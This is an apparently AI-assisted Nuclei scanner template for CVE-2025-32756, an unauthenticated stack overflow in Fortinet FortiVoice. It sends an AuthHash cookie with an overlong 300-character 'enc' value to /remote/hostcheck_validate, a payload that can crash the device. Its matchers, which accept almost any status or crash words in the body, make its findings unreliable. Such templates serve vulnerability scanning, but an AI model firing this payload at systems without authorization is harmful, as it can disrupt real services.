id: cve-2025-32756-fortivoice

info:
  name: Fortinet FortiVoice AuthHash Stack Overflow RCE - CVE-2025-32756
  author: Hacer-ko (via ChatGPT Pro)
  severity: critical
  description: |
    Fortinet FortiVoice is vulnerable to a critical unauthenticated stack buffer overflow (CVE-2025-32756) via the 
    /remote/hostcheck_validate endpoint. A specially crafted 'AuthHash' cookie containing an overly long 'enc' parameter 
    can trigger a crash and potentially lead to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-32756
    - https://fortiguard.fortinet.com/psirt/FG-IR-25-254
  classification:
    cve-id: CVE-2025-32756
    cwe-id: CWE-121
  metadata:
    vendor: fortinet
    product: fortivoice
  tags: cve,fortinet,fortivoice,rce,overflow,unauthenticated,nuclei

requests:
  - method: GET
    path:
      - "{{BaseURL}}/remote/hostcheck_validate"
    matchers:
      - type: status
        status:
          - 200
          - 301
          - 302
          - 401
          - 403
          - 405

  - method: POST
    path:
      - "{{BaseURL}}/remote/hostcheck_validate"
    headers:
      Cookie: "AuthHash=enc={{repeat('A', 300)}}"
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504
      - type: word
        part: body
        words:
          - "segmentation fault"
          - "core dumped"
          - "unexpected error"
        condition: or
